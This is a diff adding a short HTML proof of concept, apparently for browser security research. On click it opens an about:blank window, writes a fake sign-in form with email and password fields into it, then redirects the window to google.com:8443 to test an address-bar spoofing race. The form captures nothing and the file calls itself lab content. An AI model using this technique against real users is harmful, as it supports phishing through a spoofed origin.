@@ -1,0 +1,39 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Attacker — about:blank race</title>
+<style>body{font-family:system-ui;padding:24px}</style>
+<h2>Attacker demo — about:blank -> write -> optional redirect</h2>
+<p>Open about:blank, inject content, then optionally redirect to test domain</p>
+<button id="poc">Run PoC</button>
+
+<script>
+document.getElementById('poc').addEventListener('click', () => {
+  // 1) open about:blank so we control its document immediately (same-origin)
+  const w = window.open('about:blank', '_blank');
+
+  // 2) write attacker-controlled content into the new window
+  try {
+    w.document.open();
+    w.document.write(`
+      <style>body{font-family:system-ui;padding:40px}</style>
+      <h1>Sign in</h1>
+      <p>This is lab-controlled fake sign-in content.</p>
+      <input placeholder="Email"><br><input placeholder="Password" type="password"><br>
+      <small>About:blank demo — not a real site</small>
+    `);
+    w.document.close();
+  } catch (e) {
+    console.warn('Blocked from writing to new window:', e);
+  }
+
+  // 3) optional: after short delay, navigate to the test domain to compare behavior
+  setTimeout(() => {
+    try {
+      // mengganti location — ini akan melakukan navigasi ke google.com
+      w.location.replace('https://google.com:8443/');
+    } catch (err) {
+      console.warn('Navigation to test domain blocked or cross-origin:', err);
+    }
+  }, 400); // sesuaikan timing untuk eksperimen race
+});
+</script>
